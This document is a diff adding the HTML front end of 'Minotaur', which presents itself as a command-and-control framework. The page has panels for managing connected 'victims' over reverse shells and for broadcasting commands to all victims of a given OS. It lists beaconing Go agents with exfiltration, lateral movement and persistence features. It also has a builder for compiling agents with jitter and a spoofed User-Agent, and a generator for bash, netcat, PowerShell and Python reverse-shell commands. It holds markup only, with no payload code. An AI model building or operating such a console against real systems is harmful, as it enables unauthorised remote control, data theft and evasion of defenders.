@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minotaur · C2 Framework</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        .output-box {
+            background: #0a0c10;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            padding: 8px;
+            border-radius: 6px;
+            border: 1px solid #2d3748;
+        }
+        .output-box::-webkit-scrollbar { width: 6px; }
+        .output-box::-webkit-scrollbar-track { background: #1a202c; }
+        .output-box::-webkit-scrollbar-thumb { background: #4a5568; border-radius: 4px; }
+        .victim-row:hover, .agent-row:hover { background-color: #2d3748; }
+        .command-separator {
+            border-top: 1px solid #3f4e6b;
+            margin: 6px 0;
+            font-size: 10px;
+            color: #88aaff;
+        }
+        .tab-active {
+            border-bottom: 2px solid #3b82f6;
+            color: #60a5fa;
+        }
+        .log-subtab-active {
+            border-bottom: 2px solid #3b82f6;
+            color: #60a5fa;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 50;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+        }
+        .modal-content {
+            background-color: #1f2937;
+            margin: 10% auto;
+            padding: 20px;
+            border-radius: 8px;
+            width: 60%;
+            max-width: 600px;
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-200">
+
+<div class="container mx-auto px-4 py-6 max-w-[1600px]">
+    <!-- Header -->
+    <div class="flex justify-between items-center mb-6 border-b border-gray-700 pb-4">
+        <h1 class="text-3xl font-bold flex items-center gap-3">
+            <i class="fas fa-bull text-red-500"></i>
+            Minotaur · C2 Framework
+        </h1>
+        <div class="text-sm text-gray-400 bg-gray-800 px-3 py-1 rounded">
+            <i class="fas fa-plug mr-1"></i> Listening on <span id="listener-count">0</span> port(s)
+        </div>
+    </div>
+
+    <!-- Main Tabs -->
+    <div class="flex gap-4 border-b border-gray-700 mb-4">
+        <button id="tab-tcp" class="tab-btn px-4 py-2 font-semibold tab-active">🐚 TCP Shells</button>
+        <button id="tab-agents" class="tab-btn px-4 py-2 font-semibold">🤖 HTTP Agents</button>
+        <button id="tab-logs" class="tab-btn px-4 py-2 font-semibold">📜 Activity Logs</button>
+        <button id="tab-build" class="tab-btn px-4 py-2 font-semibold">🛠️ Build Agent</button>
+    </div>
+
+    <!-- ==================== TCP SHELLS ==================== -->
+    <div id="tcp-section" class="space-y-6">
+        <!-- Victims Table -->
+        <div class="bg-gray-800 rounded-xl shadow-lg overflow-hidden">
+            <div class="bg-gray-700 px-4 py-3 border-b border-gray-600 flex justify-between items-center">
+                <div>
+                    <h2 class="text-xl font-semibold"><i class="fas fa-network-wired mr-2"></i>Connected Reverse Shells</h2>
+                    <p class="text-xs text-gray-300">OS auto‑detected (Linux/Windows/macOS/BSD)</p>
+                </div>
+                <button id="gen-shell-btn" class="bg-purple-600 hover:bg-purple-700 text-sm px-3 py-1 rounded flex items-center gap-2">
+                    <i class="fas fa-code-branch"></i> Generate Shell Command
+                </button>
+            </div>
+            <div class="overflow-x-auto">
+                <table class="min-w-full divide-y divide-gray-700">
+                    <thead class="bg-gray-800">
+                        <tr><th class="px-4 py-3 text-left text-xs font-medium uppercase">ID</th><th>Host/IP</th><th>OS</th><th>Last Seen</th><th>Action</th></tr>
+                    </thead>
+                    <tbody id="victim-table-body" class="divide-y divide-gray-700"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Unified Command & Outputs -->
+        <div class="bg-gray-800 rounded-xl shadow-lg p-5">
+            <h2 class="text-xl font-semibold mb-3"><i class="fas fa-terminal text-yellow-400 mr-2"></i>Shell Outputs & Execute Command</h2>
+            <div id="outputs-container" class="space-y-4 mb-6"></div>
+            <div class="border-t border-gray-700 pt-4">
+                <textarea id="command-input" rows="3" class="w-full bg-gray-700 rounded-lg p-3 font-mono text-sm focus:ring-2 focus:ring-blue-500" placeholder="Enter system command (e.g. whoami, ls, ipconfig)"></textarea>
+                <div class="flex flex-wrap gap-3 mt-3">
+                    <select id="target-select" class="bg-gray-700 rounded-lg px-3 py-2 text-sm">
+                        <option value="single">🎯 Single victim</option>
+                        <option value="os">🌍 All victims (by OS)</option>
+                    </select>
+                    <div id="single-target-div">
+                        <select id="victim-select" class="bg-gray-700 rounded-lg px-3 py-2 text-sm min-w-[150px]"></select>
+                    </div>
+                    <div id="os-target-div" style="display:none;">
+                        <select id="os-select" class="bg-gray-700 rounded-lg px-3 py-2 text-sm">
+                            <option value="windows">Windows</option>
+                            <option value="linux">Linux</option>
+                            <option value="darwin">macOS</option>
+                            <option value="unknown">Unknown</option>
+                        </select>
+                    </div>
+                    <button id="exec-btn" class="bg-blue-600 hover:bg-blue-700 px-5 py-2 rounded-lg flex items-center gap-2">
+                        <i class="fas fa-paper-plane"></i> Send
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Dynamic Ports -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <div class="lg:col-span-2 bg-gray-800 rounded-xl shadow-lg p-5">
+                <h2 class="text-xl font-semibold mb-3"><i class="fas fa-plug text-green-400 mr-2"></i>Dynamic Ports (TCP Listeners)</h2>
+                <div class="mb-3">
+                    <label class="inline-flex items-center mr-4">
+                        <input type="radio" name="port-mode" value="single" checked class="form-radio text-blue-500">
+                        <span class="ml-2">Single Port</span>
+                    </label>
+                    <label class="inline-flex items-center">
+                        <input type="radio" name="port-mode" value="range" class="form-radio text-blue-500">
+                        <span class="ml-2">Port Range (e.g., 8000-8010)</span>
+                    </label>
+                </div>
+                <div id="single-port-input" class="flex gap-2 mb-4">
+                    <input type="number" id="new-port" placeholder="Port number" class="bg-gray-700 text-white rounded px-3 py-2 flex-1">
+                    <button id="open-port-btn" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg"><i class="fas fa-play"></i> Open</button>
+                </div>
+                <div id="range-port-input" style="display:none;" class="flex gap-2 mb-4">
+                    <input type="text" id="port-range" placeholder="e.g., 8000-8010" class="bg-gray-700 text-white rounded px-3 py-2 flex-1">
+                    <button id="open-range-btn" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg"><i class="fas fa-layer-group"></i> Open Range</button>
+                </div>
+                <h3 class="text-sm font-semibold text-gray-300 mb-2"><i class="fas fa-history mr-1"></i>Port Connection Log</h3>
+                <div id="port-log" class="bg-black rounded-lg p-2 h-48 overflow-y-auto text-xs font-mono"></div>
+            </div>
+            <div class="bg-gray-800 rounded-xl shadow-lg p-5">
+                <h2 class="text-xl font-semibold mb-3"><i class="fas fa-list-ul text-yellow-400 mr-2"></i>Currently Open Ports</h2>
+                <div id="active-ports-list" class="flex flex-wrap gap-2"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== HTTP AGENTS ==================== -->
+    <div id="agents-section" class="hidden space-y-6">
+        <div class="bg-gray-800 rounded-xl shadow-lg overflow-hidden">
+            <div class="bg-gray-700 px-4 py-3 border-b border-gray-600 flex justify-between items-center">
+                <div>
+                    <h2 class="text-xl font-semibold"><i class="fas fa-robot mr-2"></i>HTTP Agents (Go)</h2>
+                    <p class="text-xs text-gray-300">Beaconing agents with exec, exfil, lateral, persistence</p>
+                </div>
+                <button id="clear-all-agents-btn" class="bg-red-600 hover:bg-red-700 text-sm px-3 py-1 rounded flex items-center gap-2">
+                    <i class="fas fa-trash-alt"></i> Clear All Agents
+                </button>
+            </div>
+            <div class="overflow-x-auto">
+                <table class="min-w-full divide-y divide-gray-700">
+                    <thead class="bg-gray-800">
+                        <tr><th>ID</th><th>Hostname</th><th>OS/Arch</th><th>IP</th><th>Last Beacon</th><th>Status</th><th>Actions</th></tr>
+                    </thead>
+                    <tbody id="agents-table-body"></tbody>
+                </table>
+            </div>
+        </div>
+        <div class="bg-gray-800 rounded-xl shadow-lg p-5">
+            <h2 class="text-xl font-semibold mb-3"><i class="fas fa-terminal text-yellow-400 mr-2"></i>Execute Command on Agent</h2>
+            <textarea id="agent-command-input" rows="3" class="w-full bg-gray-700 rounded-lg p-3 font-mono text-sm focus:ring-2 focus:ring-blue-500" placeholder="Enter system command (e.g. whoami, ls, ipconfig)"></textarea>
+            <div class="flex flex-wrap gap-3 mt-3">
+                <select id="agent-select" class="bg-gray-700 rounded-lg px-3 py-2 text-sm min-w-[200px]">
+                    <option value="">-- Select an agent --</option>
+                </select>
+                <button id="agent-exec-btn" class="bg-blue-600 hover:bg-blue-700 px-5 py-2 rounded-lg flex items-center gap-2">
+                    <i class="fas fa-paper-plane"></i> Send to Agent
+                </button>
+            </div>
+        </div>
+        <div class="bg-gray-800 rounded-xl shadow-lg p-5">
+            <h2 class="text-xl font-semibold mb-3"><i class="fas fa-history text-yellow-400 mr-2"></i>Agent Activity Log</h2>
+            <div id="agent-log" class="bg-black rounded-lg p-2 h-64 overflow-y-auto text-xs font-mono"></div>
+        </div>
+    </div>
+
+    <!-- ==================== ACTIVITY LOGS ==================== -->
+    <div id="logs-section" class="hidden space-y-6">
+        <div class="bg-gray-800 rounded-xl shadow-lg p-5">
+            <div class="flex gap-4 border-b border-gray-700 mb-4">
+                <button id="tab-shell-logs" class="log-subtab px-3 py-1 text-sm font-semibold text-blue-400 border-b-2 border-blue-400">Shell Logs</button>
+                <button id="tab-agent-logs" class="log-subtab px-3 py-1 text-sm font-semibold text-gray-400">Agent Logs</button>
+            </div>
+            <div id="shell-logs-panel">
+                <div class="mb-3 flex gap-2">
+                    <input type="text" id="shell-log-filter" placeholder="Filter by victim ID" class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
+                    <button id="refresh-shell-logs" class="bg-blue-600 px-3 py-1 rounded text-sm">Refresh</button>
+                </div>
+                <div id="shell-logs-container" class="bg-black rounded-lg p-2 h-96 overflow-y-auto text-xs font-mono"></div>
+            </div>
+            <div id="agent-logs-panel" class="hidden">
+                <div class="mb-3 flex gap-2">
+                    <input type="text" id="agent-log-filter" placeholder="Filter by agent ID" class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
+                    <button id="refresh-agent-logs" class="bg-blue-600 px-3 py-1 rounded text-sm">Refresh</button>
+                </div>
+                <div id="agent-logs-container" class="bg-black rounded-lg p-2 h-96 overflow-y-auto text-xs font-mono"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== BUILD AGENT ==================== -->
+    <div id="build-section" class="hidden space-y-6">
+        <div class="bg-gray-800 rounded-xl shadow-lg p-5">
+            <h2 class="text-xl font-semibold mb-3"><i class="fas fa-code-branch text-green-400 mr-2"></i>Compile Minotaur Agent</h2>
+            <p class="text-sm text-gray-300 mb-4">Customise the agent's communication parameters and compile for any platform.</p>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <label class="block text-sm font-medium mb-1">C2 Server URL</label>
+                    <input type="text" id="build-c2-url" class="w-full bg-gray-700 rounded px-3 py-2" value="http://192.168.2.133:5000">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium mb-1">Beacon Delay (seconds)</label>
+                    <input type="number" id="build-beacon-delay" class="w-full bg-gray-700 rounded px-3 py-2" value="60" min="5">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium mb-1">Jitter (seconds)</label>
+                    <input type="number" id="build-jitter" class="w-full bg-gray-700 rounded px-3 py-2" value="5" min="0">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium mb-1">User-Agent</label>
+                    <input type="text" id="build-user-agent" class="w-full bg-gray-700 rounded px-3 py-2" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36">
+                </div>
+                <div class="flex items-center">
+                    <input type="checkbox" id="build-insecure-tls" class="mr-2" checked>
+                    <label class="text-sm font-medium">Skip TLS verification (InsecureTLS)</label>
+                </div>
+            </div>
+            <div class="mt-4 border-t border-gray-700 pt-4">
+                <h3 class="text-md font-semibold mb-2">Target Platform</h3>
+                <div class="flex flex-wrap gap-4">
+                    <select id="build-goos" class="bg-gray-700 rounded px-3 py-2">
+                        <option value="windows">Windows</option>
+                        <option value="linux">Linux</option>
+                        <option value="darwin">macOS</option>
+                    </select>
+                    <select id="build-goarch" class="bg-gray-700 rounded px-3 py-2">
+                        <option value="amd64">amd64 (64-bit)</option>
+                        <option value="386">386 (32-bit)</option>
+                        <option value="arm64">arm64 (ARM64)</option>
+                    </select>
+                    <button id="build-agent-btn" class="bg-green-600 hover:bg-green-700 px-5 py-2 rounded-lg flex items-center gap-2">
+                        <i class="fas fa-cogs"></i> Compile & Download
+                    </button>
+                </div>
+            </div>
+            <div id="build-status" class="mt-4 p-2 bg-black rounded text-sm font-mono hidden"></div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal for generating reverse shell commands -->
+<div id="shell-modal" class="modal">
+    <div class="modal-content">
+        <div class="flex justify-between items-center mb-4">
+            <h2 class="text-xl font-bold">Generate Reverse Shell Command</h2>
+            <span id="close-modal" class="cursor-pointer text-gray-400 hover:text-white text-2xl">&times;</span>
+        </div>
+        <label class="block mb-2">IP / Domain</label>
+        <input type="text" id="shell-ip" class="w-full bg-gray-700 rounded p-2 mb-3" value="127.0.0.1">
+        <label class="block mb-2">Port</label>
+        <input type="number" id="shell-port" class="w-full bg-gray-700 rounded p-2 mb-3" value="4444">
+        <label class="block mb-2">Type</label>
+        <select id="shell-type" class="w-full bg-gray-700 rounded p-2 mb-3">
+            <option value="bash">Bash (Linux/macOS)</option>
+            <option value="nc">Netcat (traditional)</option>
+            <option value="ncat">Ncat (with SSL)</option>
+            <option value="powershell">PowerShell (Windows)</option>
+            <option value="python">Python</option>
+        </select>
+        <button id="copy-shell-cmd" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded w-full">Copy Command</button>
+        <textarea id="shell-output-cmd" readonly rows="4" class="w-full bg-gray-900 rounded p-2 mt-3 text-sm font-mono"></textarea>
+    </div>
+</div>
+
+<script src="/static/js/dashboard.js"></script>
+</body>
+</html>
